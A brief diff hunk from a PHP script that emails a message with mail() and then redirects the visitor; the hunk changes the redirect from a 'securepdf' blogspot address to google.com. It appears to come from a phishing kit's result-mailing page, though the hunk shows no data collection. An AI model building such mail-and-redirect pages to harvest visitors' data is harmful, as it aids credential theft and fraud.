@@ -89,6 +89,6 @@ function country_sort(){
 
 mail($send,$judul,$message);
 
-header("Location: https://securepdf.blogspot.com/");
+header("Location: https://google.com/");
 
 ?>
